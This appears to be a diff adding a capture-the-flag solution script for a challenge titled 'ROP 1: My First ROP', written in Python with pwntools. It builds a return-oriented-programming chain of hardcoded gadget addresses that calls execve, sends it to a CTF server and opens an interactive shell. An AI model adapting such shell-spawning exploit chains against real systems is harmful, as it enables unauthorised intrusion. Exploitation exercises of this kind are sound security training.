@@ -1,0 +1,31 @@
+Pwn | 108 | ROP 1: My First ROP by Auxy
+
+from pwn import *
+
+popRdi = p64(0x0000000000400189)
+popRdx = p64(0x000000000040018d)
+popRsi = p64(0x000000000040018b)
+popRax = p64(0x0000000000400187)
+syscall = p64(0x0000000000400184)
+offset = 8
+
+shellcode = 'A'*offset
+shellcode += popRdx
+shellcode += p64(0)
+shellcode += popRsi
+shellcode += p64(0)
+shellcode += popRax
+shellcode += p64(0x3b)
+shellcode += popRdi
+shellcode += p64(0x40018f)
+shellcode += syscall
+
+print shellcode
+
+bin = remote('university.opentoallctf.com', 30001)
+bin.recvuntil(':')
+bin.sendline(shellcode)
+bin.interactive()
+
+
+
